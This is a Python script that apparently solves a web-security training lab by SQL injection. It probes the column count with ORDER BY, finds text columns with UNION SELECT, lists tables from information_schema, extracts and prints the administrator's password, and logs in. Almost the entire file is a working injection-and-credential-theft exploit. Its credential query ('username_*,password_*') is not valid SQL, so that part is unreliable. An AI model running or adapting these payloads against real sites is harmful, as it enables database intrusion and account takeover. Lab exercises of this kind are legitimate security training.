import requests
from bs4 import BeautifulSoup
import re

def get_cookie(url):
    """Get session cookie from the lab URL"""
    try:
        response = requests.get(url)
        return response.cookies.get('session')
    except Exception as e:
        print(f"[-] Error getting cookie: {e}")
        return None

def get_column_count(url, session_cookie):
    """Determine number of columns in the query"""
    vulnerable_param = "category=Accessories"

    for i in range(1, 10):
        payload = f"' ORDER BY {i}-- -"
        full_url = f"{url}?{vulnerable_param}{payload}"

        try:
            response = requests.get(
                full_url,
                cookies={'session': session_cookie}
            )

            if "Internal Server Error" not in response.text:
                continue

            # Found the maximum column count
            return i - 1

        except Exception as e:
            print(f"[-] Error checking column count: {e}")
            continue

    return None

def get_text_columns(url, session_cookie, column_count):
    """Find which columns accept text data"""
    vulnerable_param = "category=Accessories"

    for i in range(column_count):
        payload = f"' UNION SELECT "

        for j in range(column_count):
            if j == i:
                payload += " 'abc',"
            else:
                payload += "NULL,"

        payload = payload.rstrip(",") + "-- -"
        full_url = f"{url}?{vulnerable_param}{payload}"

        try:
            response = requests.get(
                full_url,
                cookies={'session': session_cookie}
            )

            if "abc" in response.text:
                return i

        except Exception as e:
            print(f"[-] Error finding text columns: {e}")
            continue

    return None

def get_tables(url, session_cookie):
    """Retrieve list of tables from the database"""
    vulnerable_param = "category=Accessories"
    payload = f"' UNION SELECT table_name,NULL FROM information_schema.tables-- -"
    full_url = f"{url}?{vulnerable_param}{payload}"

    try:
        response = requests.get(
            full_url,
            cookies={'session': session_cookie}
        )

        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for table names in the response
        for text in soup.stripped_strings:
            if "users_" in text.lower():
                return text.strip()

        # If not found in visible text, search raw HTML
        table_match = re.search(r'(users_[a-zA-Z0-9_]+)', response.text)
        if table_match:
            return table_match.group(1)

    except Exception as e:
        print(f"[-] Error retrieving tables: {e}")
        return None

def get_credentials(url, session_cookie, table_name):
    """Extract credentials from the users table"""
    vulnerable_param = "category=Accessories"
    payload = f"' UNION SELECT username_*,password_* FROM {table_name}-- -"
    full_url = f"{url}?{vulnerable_param}{payload}"

    try:
        response = requests.get(
            full_url,
            cookies={'session': session_cookie}
        )

        soup = BeautifulSoup(response.text, 'html.parser')

        # Look for admin credentials
        for row in soup.find_all("tr"):
            cols = row.find_all("td")
            if len(cols) >= 2 and "administrator" in cols[0].text:
                return (cols[0].text.strip(), cols[1].text.strip())

        # Fallback: search raw HTML
        cred_match = re.search(r'administrator</td><td>([^<]+)</td>', response.text)
        if cred_match:
            return ("administrator", cred_match.group(1))

    except Exception as e:
        print(f"[-] Error extracting credentials: {e}")
        return None

def login(url, username, password):
    """Log in to the application with the retrieved credentials"""
    login_url = url.rstrip('/') + '/login'

    try:
        session = requests.Session()
        response = session.get(login_url)

        csrf_token = re.search(r'name="csrf".*?value="(.*?)"', response.text)
        if not csrf_token:
            print("[-] Could not find CSRF token")
            return False

        data = {
            "csrf": csrf_token.group(1),
            "username": username,
            "password": password
        }

        response = session.post(login_url, data=data)

        # Check if we got redirected to /my-account
        if "/my-account" in response.url:
            print("[+] Successfully logged in as administrator!")
            return True

        print("[-] Login failed")
        return False

    except Exception as e:
        print(f"[-] Error during login: {e}")
        return False

def solve_lab(url):
    """Main function to orchestrate the attack"""
    print("[+] Starting SQL injection lab solver...")

    # Get session cookie
    session_cookie = get_cookie(url)
    if not session_cookie:
        print("[-] Failed to get session cookie")
        return False

    # Get column count
    column_count = get_column_count(url, session_cookie)
    if not column_count:
        print("[-] Failed to determine column count")
        return False
    print(f"[+] Found {column_count} columns")

    # Find text columns
    text_column = get_text_columns(url, session_cookie, column_count)
    if text_column is None:
        print("[-] Failed to find text columns")
        return False
    print(f"[+] Found text column at position {text_column}")

    # Get table name
    table_name = get_tables(url, session_cookie)
    if not table_name:
        print("[-] Failed to find users table")
        return False
    print(f"[+] Found users table: {table_name}")

    # Get credentials
    credentials = get_credentials(url, session_cookie, table_name)
    if not credentials:
        print("[-] Failed to extract credentials")
        return False
    print(f"[+] Extracted credentials: {credentials[0]}:{credentials[1]}")

    # Log in
    return login(url, credentials[0], credentials[1])

if __name__ == "__main__":
    lab_url = input("Enter the lab URL (e.g., https://abcxyz.web-security-academy.net):  ").strip()
    if solve_lab(lab_url):
        print("[+] Lab solved successfully!")
    else:
        print("[-] Failed to solve lab")
